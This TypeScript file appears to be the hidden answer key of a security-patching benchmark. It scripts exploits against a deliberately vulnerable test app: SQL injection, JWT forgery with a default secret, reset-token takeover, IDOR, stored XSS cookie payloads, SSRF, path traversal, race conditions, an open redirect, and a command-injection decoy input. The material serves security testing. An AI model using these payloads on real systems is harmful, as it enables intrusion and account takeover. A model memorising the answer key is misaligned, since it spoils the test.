// Executable answer key for the Arena. HIDDEN from the defender (lives in judge/).
// Each probe has an `exploit` (must succeed on the pristine app) and a
// `functional` check (the legit feature, must keep working after a real patch).
// Decoys are non-exploitable bait: their `exploit` must NOT succeed.

import { createHmac } from "crypto";
import { INTERNAL_SENTINEL } from "./mock-internal";

export interface ProbeResult {
  ok: boolean;
  evidence: string;
}
export interface ProbeContext {
  base: string;
  internalUrl: string;
}
export interface Probe {
  id: string;
  title: string;
  area: string;
  owasp: string;
  difficulty: "easy" | "medium" | "hard";
  isDecoy?: boolean;
  location: string;
  exploit: (ctx: ProbeContext) => Promise<ProbeResult>;
  functional: (ctx: ProbeContext) => Promise<ProbeResult>;
}

const MAYA = { email: "maya@acme.test", password: "maya-password-123" };

interface ApiResp {
  status: number;
  json: any;
  text: string;
  headers: Headers;
}

async function api(
  base: string,
  method: string,
  path: string,
  opts: { token?: string; body?: any; query?: Record<string, string> } = {}
): Promise<ApiResp> {
  let url = base + path;
  if (opts.query) {
    const qs = new URLSearchParams(opts.query).toString();
    url += (path.includes("?") ? "&" : "?") + qs;
  }
  const headers: Record<string, string> = {};
  if (opts.token) headers["authorization"] = `Bearer ${opts.token}`;
  let body: string | undefined;
  if (opts.body !== undefined) {
    headers["content-type"] = "application/json";
    body = JSON.stringify(opts.body);
  }
  const resp = await fetch(url, { method, headers, body });
  const text = await resp.text();
  let json: any = null;
  try {
    json = JSON.parse(text);
  } catch {}
  return { status: resp.status, json, text, headers: resp.headers };
}

async function login(base: string, email: string, password: string): Promise<string> {
  const r = await api(base, "POST", "/api/auth/login", { body: { email, password } });
  return r.json?.token ?? "";
}

function forgeJwt(secret: string, claims: Record<string, any>): string {
  const enc = (o: any) => Buffer.from(JSON.stringify(o)).toString("base64url");
  const header = enc({ alg: "HS256", typ: "JWT" });
  const iat = Math.floor(Date.now() / 1000);
  const payload = enc({ iss: "tasklight", iat, exp: iat + 3600, ...claims });
  const sig = createHmac("sha256", secret).update(`${header}.${payload}`).digest("base64url");
  return `${header}.${payload}.${sig}`;
}

const nowSec = () => Math.floor(Date.now() / 1000);

export const PROBES: Probe[] = [
  {
    id: "sqli-login",
    title: "SQL injection auth bypass on login",
    area: "login",
    owasp: "A03:2021 Injection",
    difficulty: "easy",
    location: "server/routes/auth.ts POST /api/auth/login",
    async exploit({ base }) {
      const r = await api(base, "POST", "/api/auth/login", {
        body: { email: "x' OR role='admin' -- ", password: "anything" },
      });
      const ok = r.status === 200 && r.json?.user?.role === "admin";
      return { ok, evidence: `status=${r.status} role=${r.json?.user?.role}` };
    },
    async functional({ base }) {
      const r = await api(base, "POST", "/api/auth/login", { body: MAYA });
      return { ok: r.status === 200 && !!r.json?.token, evidence: `login status=${r.status}` };
    },
  },
  {
    id: "jwt-weak-secret",
    title: "Forgeable session tokens (weak/default JWT secret)",
    area: "authentication",
    owasp: "A02:2021 Cryptographic Failures",
    difficulty: "medium",
    location: "server/auth.ts signToken/verifyToken + config.jwtSecret",
    async exploit({ base }) {
      const forged = forgeJwt("tasklight-secret", { sub: 1, email: "admin@tasklight.io", role: "admin", name: "Tasklight Admin" });
      const r = await api(base, "GET", "/api/auth/me", { token: forged });
      const ok = r.status === 200 && r.json?.user?.role === "admin";
      return { ok, evidence: `forged-admin me status=${r.status} role=${r.json?.user?.role}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/auth/me", { token });
      return { ok: r.status === 200, evidence: `legit token me status=${r.status}` };
    },
  },
  {
    id: "predictable-reset-token",
    title: "Predictable password reset token enables account takeover",
    area: "password reset",
    owasp: "A07:2021 Identification & Authentication Failures",
    difficulty: "medium",
    location: "server/routes/auth.ts POST /api/auth/reset",
    async exploit({ base }) {
      const token = Buffer.from(`1:${nowSec()}`).toString("base64url");
      const r = await api(base, "POST", "/api/auth/reset", { body: { token, password: "pwned-by-attacker" } });
      const relogin = await api(base, "POST", "/api/auth/login", {
        body: { email: "admin@tasklight.io", password: "pwned-by-attacker" },
      });
      const ok = r.status === 200 && relogin.status === 200 && relogin.json?.user?.role === "admin";
      return { ok, evidence: `reset=${r.status} relogin=${relogin.status}` };
    },
    async functional({ base }) {
      const r = await api(base, "POST", "/api/auth/forgot", { body: { email: MAYA.email } });
      return { ok: r.status === 200, evidence: `forgot status=${r.status}` };
    },
  },
  {
    id: "user-enumeration",
    title: "Username enumeration via reset response",
    area: "login",
    owasp: "A07:2021 Identification & Authentication Failures",
    difficulty: "easy",
    location: "server/routes/auth.ts POST /api/auth/forgot",
    async exploit({ base }) {
      const known = await api(base, "POST", "/api/auth/forgot", { body: { email: MAYA.email } });
      const unknown = await api(base, "POST", "/api/auth/forgot", { body: { email: "nobody-here@nowhere.test" } });
      const ok = known.status !== unknown.status;
      return { ok, evidence: `known=${known.status} unknown=${unknown.status}` };
    },
    async functional({ base }) {
      const r = await api(base, "POST", "/api/auth/forgot", { body: { email: MAYA.email } });
      return { ok: r.status === 200, evidence: `forgot known status=${r.status}` };
    },
  },
  {
    id: "mass-assignment-role",
    title: "Privilege escalation via mass assignment on profile update",
    area: "user profile",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "medium",
    location: "server/routes/users.ts PATCH /api/users/me",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      await api(base, "PATCH", "/api/users/me", { token, body: { role: "admin" } });
      const me = await api(base, "GET", "/api/users/me", { token });
      const ok = me.json?.user?.role === "admin";
      return { ok, evidence: `role after patch=${me.json?.user?.role}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "PATCH", "/api/users/me", { token, body: { name: "Maya C." } });
      return { ok: r.status === 200 && r.json?.user?.name === "Maya C.", evidence: `name update status=${r.status}` };
    },
  },
  {
    id: "idor-task",
    title: "IDOR: read any task across workspaces",
    area: "IDOR",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "easy",
    location: "server/routes/tasks.ts GET /api/tasks/:id",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/tasks/3", { token }); // Globex secret task
      const ok = r.status === 200 && /acquisition/i.test(r.text);
      return { ok, evidence: `status=${r.status} title=${r.json?.task?.title ?? ""}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/tasks/1", { token });
      return { ok: r.status === 200, evidence: `own task status=${r.status}` };
    },
  },
  {
    id: "idor-file",
    title: "IDOR: read file metadata across workspaces",
    area: "file access",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "medium",
    location: "server/routes/files.ts GET /api/files/:id",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/files/1", { token }); // Globex file
      const ok = r.status === 200 && /falcon-financials/.test(r.text);
      return { ok, evidence: `status=${r.status} file=${r.json?.file?.filename ?? ""}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/files/2", { token });
      return { ok: r.status === 200, evidence: `own file meta status=${r.status}` };
    },
  },
  {
    id: "missing-admin-authz",
    title: "Missing function-level authorization on admin user list",
    area: "admin panel",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "medium",
    location: "server/routes/admin.ts GET /api/admin/users",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password); // global role 'user'
      const r = await api(base, "GET", "/api/admin/users", { token });
      const ok = r.status === 200 && Array.isArray(r.json?.users) && r.json.users.length >= 5;
      return { ok, evidence: `non-admin status=${r.status} users=${r.json?.users?.length}` };
    },
    async functional({ base }) {
      const admin = forgeJwt("tasklight-secret", { sub: 1, email: "admin@tasklight.io", role: "admin", name: "A" });
      const r = await api(base, "GET", "/api/admin/users", { token: admin });
      return { ok: r.status === 200, evidence: `admin status=${r.status}` };
    },
  },
  {
    id: "broken-role-check",
    title: "Privilege escalation: assign a role above your own",
    area: "IDOR",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "hard",
    location: "server/routes/workspaces.ts POST /api/workspaces/:wsId/members/:userId/role",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password); // ws1 admin, not owner
      const r = await api(base, "POST", "/api/workspaces/1/members/2/role", { token, body: { role: "owner" } });
      const members = await api(base, "GET", "/api/workspaces/1/members", { token });
      const maya = (members.json?.members ?? []).find((m: any) => m.user_id === 2);
      const ok = r.status === 200 && maya?.role === "owner";
      return { ok, evidence: `set-role=${r.status} maya.role=${maya?.role}` };
    },
    async functional({ base }) {
      const owner = await login(base, "leo@acme.test", "leo-password-123");
      const r = await api(base, "POST", "/api/workspaces/1/members/5/role", { token: owner, body: { role: "member" } });
      return { ok: r.status === 200, evidence: `owner sets member status=${r.status}` };
    },
  },
  {
    id: "stored-xss",
    title: "Stored XSS in task export view",
    area: "XSS",
    owasp: "A03:2021 Injection",
    difficulty: "easy",
    location: "server/routes/tasks.ts GET /api/tasks/:id/export.html",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const payload = `<img src=x onerror="alert(document.cookie)">`;
      await api(base, "POST", "/api/tasks/1/comments", { token, body: { body: payload } });
      const r = await api(base, "GET", "/api/tasks/1/export.html", { token });
      const ct = r.headers.get("content-type") ?? "";
      const ok = ct.includes("text/html") && r.text.includes("onerror=");
      return { ok, evidence: `ct=${ct} rawPayloadPresent=${r.text.includes("onerror=")}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/tasks/1/export.html", { token });
      return { ok: r.status === 200 && r.text.includes("<h1>"), evidence: `export status=${r.status}` };
    },
  },
  {
    id: "sqli-search",
    title: "SQL injection (UNION) in task search",
    area: "search",
    owasp: "A03:2021 Injection",
    difficulty: "medium",
    location: "server/routes/search.ts GET /api/search",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/search", {
        token,
        query: { q: "zzz' UNION SELECT id, email FROM users -- " },
      });
      const ok = r.status === 200 && /admin@tasklight\.io/.test(r.text);
      return { ok, evidence: `status=${r.status} leakedAdminEmail=${/admin@tasklight\.io/.test(r.text)}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/search", { token, query: { q: "Redesign" } });
      return { ok: r.status === 200 && Array.isArray(r.json?.results), evidence: `search status=${r.status}` };
    },
  },
  {
    id: "sqli-reports",
    title: "SQL injection (UNION) in task report filter",
    area: "reports",
    owasp: "A03:2021 Injection",
    difficulty: "hard",
    location: "server/routes/reports.ts GET /api/reports/tasks",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/reports/tasks", {
        token,
        query: { workspaceId: "1", status: "zzz' UNION SELECT id, email, password_hash FROM users -- " },
      });
      const ok = r.status === 200 && /admin@tasklight\.io/.test(r.text);
      return { ok, evidence: `status=${r.status} leaked=${/admin@tasklight\.io/.test(r.text)}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/reports/tasks", { token, query: { workspaceId: "1", status: "todo" } });
      return { ok: r.status === 200 && Array.isArray(r.json?.rows), evidence: `report status=${r.status}` };
    },
  },
  {
    id: "ssrf-integration",
    title: "SSRF via webhook integration test",
    area: "integrations",
    owasp: "A10:2021 Server-Side Request Forgery",
    difficulty: "medium",
    location: "server/routes/integrations.ts POST /api/integrations/:wsId/test",
    async exploit({ base, internalUrl }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "POST", "/api/integrations/1/test", { token, body: { url: internalUrl } });
      const ok = r.text.includes(INTERNAL_SENTINEL);
      return { ok, evidence: `internalSentinelReturned=${ok} status=${r.status}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "POST", "/api/integrations/1", { token, body: { name: "Webhook", webhookUrl: "https://hooks.example.test/x" } });
      return { ok: r.status === 201, evidence: `create integration status=${r.status}` };
    },
  },
  {
    id: "ssrf-avatar",
    title: "SSRF via avatar import-from-URL",
    area: "user profile",
    owasp: "A10:2021 Server-Side Request Forgery",
    difficulty: "medium",
    location: "server/routes/users.ts POST /api/users/me/avatar",
    async exploit({ base, internalUrl }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "POST", "/api/users/me/avatar", { token, body: { url: internalUrl } });
      const ok = r.text.includes(INTERNAL_SENTINEL);
      return { ok, evidence: `internalSentinelReturned=${ok} status=${r.status}` };
    },
    async functional({ base, internalUrl }) {
      const token = await login(base, MAYA.email, MAYA.password);
      // Importing a normal (reachable) URL should still succeed.
      const r = await api(base, "POST", "/api/users/me/avatar", { token, body: { url: internalUrl } });
      return { ok: r.status === 200 && r.json?.ok === true, evidence: `avatar import status=${r.status}` };
    },
  },
  {
    id: "path-traversal",
    title: "Path traversal in legacy file download",
    area: "file access",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "medium",
    location: "server/routes/files.ts GET /api/files/download",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/files/download", { token, query: { path: "../server/config.ts" } });
      const ok = r.status === 200 && /jwtSecret/.test(r.text);
      return { ok, evidence: `status=${r.status} leakedSource=${/jwtSecret/.test(r.text)}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/files/download", { token, query: { path: "seed-brand-guide.txt" } });
      return { ok: r.status === 200 && /Acme brand guide/.test(r.text), evidence: `legit download status=${r.status}` };
    },
  },
  {
    id: "unrestricted-upload",
    title: "Unrestricted upload served inline (stored XSS / HTML injection)",
    area: "file upload",
    owasp: "A05:2021 Security Misconfiguration",
    difficulty: "hard",
    location: "server/routes/files.ts POST /api/files + GET /api/files/:id/raw",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const data = Buffer.from(`<script>alert(document.domain)</script>`).toString("base64");
      const up = await api(base, "POST", "/api/files", {
        token,
        body: { workspaceId: 1, filename: "report.html", contentType: "text/html", dataBase64: data },
      });
      const id = up.json?.id;
      const raw = await api(base, "GET", `/api/files/${id}/raw`, { token });
      const ct = raw.headers.get("content-type") ?? "";
      const ok = ct.includes("text/html") && raw.text.includes("<script>");
      return { ok, evidence: `served ct=${ct} scriptPresent=${raw.text.includes("<script>")}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const data = Buffer.from("hello").toString("base64");
      const up = await api(base, "POST", "/api/files", {
        token,
        body: { workspaceId: 1, filename: "note.txt", contentType: "text/plain", dataBase64: data },
      });
      const raw = await api(base, "GET", `/api/files/${up.json?.id}/raw`, { token });
      return { ok: raw.status === 200 && raw.text === "hello", evidence: `upload+fetch status=${raw.status}` };
    },
  },
  {
    id: "price-tampering",
    title: "Plan upgrade trusts client-supplied price",
    area: "billing",
    owasp: "A04:2021 Insecure Design",
    difficulty: "medium",
    location: "server/routes/billing.ts POST /api/billing/:wsId/upgrade",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "POST", "/api/billing/1/upgrade", { token, body: { plan: "enterprise", seats: 100, priceCents: 0 } });
      const ok = r.status === 200 && r.json?.billing?.plan === "enterprise" && r.json?.billing?.balance_cents === 0;
      return { ok, evidence: `plan=${r.json?.billing?.plan} balance=${r.json?.billing?.balance_cents}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "POST", "/api/billing/1/upgrade", { token, body: { plan: "pro", seats: 5, priceCents: 5000 } });
      return { ok: r.status === 200 && r.json?.billing?.plan === "pro", evidence: `legit upgrade status=${r.status}` };
    },
  },
  {
    id: "coupon-race",
    title: "Coupon reuse via race condition",
    area: "billing",
    owasp: "A04:2021 Insecure Design",
    difficulty: "hard",
    location: "server/routes/billing.ts POST /api/billing/:wsId/redeem",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const tries = Array.from({ length: 8 }, () =>
        api(base, "POST", "/api/billing/1/redeem", { token, body: { code: "LAUNCH50" } })
      );
      const results = await Promise.all(tries);
      const successes = results.filter((r) => r.status === 200).length;
      const ok = successes > 1;
      return { ok, evidence: `concurrent successes=${successes} (max_redemptions=1)` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const first = await api(base, "POST", "/api/billing/1/redeem", { token, body: { code: "LAUNCH50" } });
      const second = await api(base, "POST", "/api/billing/1/redeem", { token, body: { code: "LAUNCH50" } });
      return { ok: first.status === 200 && second.status === 409, evidence: `first=${first.status} second=${second.status}` };
    },
  },
  {
    id: "secrets-exposure",
    title: "Diagnostics endpoint leaks JWT signing secret",
    area: "secrets",
    owasp: "A05:2021 Security Misconfiguration",
    difficulty: "easy",
    location: "server/routes/misc.ts GET /api/config",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/config", { token });
      const ok = r.status === 200 && typeof r.json?.jwtSecret === "string" && r.json.jwtSecret.length > 0;
      return { ok, evidence: `jwtSecretLeaked=${ok}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/config", { token });
      return { ok: r.status === 200 && !!r.json?.version, evidence: `config version=${r.json?.version}` };
    },
  },
  {
    id: "open-redirect",
    title: "Open redirect on SSO callback",
    area: "login",
    owasp: "A01:2021 Broken Access Control",
    difficulty: "easy",
    location: "server/routes/auth.ts GET /api/auth/sso/callback",
    async exploit({ base }) {
      const resp = await fetch(`${base}/api/auth/sso/callback?next=https://evil.example/phish`, { redirect: "manual" });
      const loc = resp.headers.get("location") ?? "";
      const ok = resp.status === 302 && loc.startsWith("https://evil.example");
      return { ok, evidence: `status=${resp.status} location=${loc}` };
    },
    async functional({ base }) {
      const resp = await fetch(`${base}/api/auth/sso/callback?next=/dashboard`, { redirect: "manual" });
      const loc = resp.headers.get("location") ?? "";
      return { ok: resp.status === 302 && loc === "/dashboard", evidence: `relative redirect=${loc}` };
    },
  },

  // ---------------- Decoys (must NOT be exploitable) ----------------
  {
    id: "decoy-cmd-ping",
    title: "Decoy: host ping looks like command injection",
    area: "diagnostics",
    owasp: "(decoy)",
    difficulty: "medium",
    isDecoy: true,
    location: "server/routes/misc.ts GET /api/net/ping",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/net/ping", { token, query: { host: "127.0.0.1; id" } });
      // Command injection would surface uid=... ; safe dns.lookup never does.
      const ok = /uid=\d+/.test(r.text);
      return { ok, evidence: `cmdOutputPresent=${ok} status=${r.status}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/net/ping", { token, query: { host: "localhost" } });
      return { ok: r.status === 200, evidence: `ping status=${r.status}` };
    },
  },
  {
    id: "decoy-directory-sqli",
    title: "Decoy: directory lookup looks injectable",
    area: "search",
    owasp: "(decoy)",
    difficulty: "medium",
    isDecoy: true,
    location: "server/routes/misc.ts GET /api/directory",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/directory", { token, query: { email: "' OR '1'='1" } });
      // Parameterised query returns no user for the injection string.
      const ok = r.json?.user != null;
      return { ok, evidence: `injectionReturnedUser=${ok}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/directory", { token, query: { email: "maya@acme.test" } });
      return { ok: r.status === 200 && r.json?.user?.name === "Maya Chen", evidence: `lookup ok` };
    },
  },
  {
    id: "decoy-token-verify",
    title: "Decoy: token verify looks bypassable",
    area: "authentication",
    owasp: "(decoy)",
    difficulty: "medium",
    isDecoy: true,
    location: "server/routes/misc.ts POST /api/tokens/verify",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const forged = forgeJwt("WRONG-SECRET", { sub: 1, role: "admin", email: "admin@tasklight.io", name: "A" });
      const r = await api(base, "POST", "/api/tokens/verify", { token, body: { token: forged } });
      const ok = r.status === 200 && r.json?.valid === true;
      return { ok, evidence: `forgedAcceptedWithWrongSecret=${ok}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "POST", "/api/tokens/verify", { token, body: { token } });
      return { ok: r.status === 200 && r.json?.valid === true, evidence: `valid token verified` };
    },
  },
  {
    id: "decoy-template-eval",
    title: "Decoy: template preview looks like SSTI",
    area: "templating",
    owasp: "(decoy)",
    difficulty: "medium",
    isDecoy: true,
    location: "server/routes/misc.ts GET /api/preview",
    async exploit({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/preview", { token, query: { tpl: "${7*7}" } });
      // eval path is gated behind an env that is never set; safe replace leaves it literal.
      const ok = r.json?.rendered === "49";
      return { ok, evidence: `evaluated=${ok} rendered=${r.json?.rendered}` };
    },
    async functional({ base }) {
      const token = await login(base, MAYA.email, MAYA.password);
      const r = await api(base, "GET", "/api/preview", { token, query: { tpl: "hello {{user}}" } });
      return { ok: r.status === 200 && /hello /.test(r.json?.rendered ?? ""), evidence: `preview ok` };
    },
  },
];

export const VULN_PROBES = PROBES.filter((p) => !p.isDecoy);
export const DECOY_PROBES = PROBES.filter((p) => p.isDecoy);
